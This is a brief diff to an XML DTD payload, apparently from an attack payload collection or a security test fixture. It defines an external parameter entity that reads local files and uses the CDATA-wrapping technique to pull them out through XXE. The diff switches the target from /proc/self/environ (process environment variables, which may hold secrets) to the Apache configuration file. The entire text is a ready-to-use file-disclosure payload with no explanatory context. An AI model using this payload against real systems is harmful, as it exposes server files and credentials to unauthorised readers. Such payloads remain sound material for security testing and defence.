@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:/proc/self/environ">
+<!ENTITY % file SYSTEM "file:/etc/apache2/apache2.conf">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
